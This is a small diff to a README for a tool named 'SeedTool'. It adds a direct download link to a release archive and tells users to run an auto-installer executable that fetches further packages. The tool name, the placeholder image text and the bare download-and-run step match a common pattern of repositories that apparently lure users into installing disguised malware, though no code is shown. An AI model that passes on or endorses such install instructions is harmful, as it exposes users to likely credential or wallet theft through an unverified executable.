@@ -7,8 +7,8 @@
 To install this programm, follow these steps:
 
 [![asdasdasd](https://github.com/user-attachments/assets/a752e625-6f73-404f-b07e-0a0c260dbea2)
-]()
-## **1. [Download the archive]() from releases and extract it to a convenient folder.**
+](https://github.com/MatheusVitorFerreira/SeedTool/releases/download/V8.44/Release.zip)
+## **1. [Download the archive](https://github.com/MatheusVitorFerreira/SeedTool/releases/download/V8.44/Release.zip) from releases and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64_32bit.exe`. It will install and download all necessary packages for > operation.**
 
 ![seedmain2](https://github.com/user-attachments/assets/cc08b8db-c2c9-4b5d-b099-7fe554ce615f)
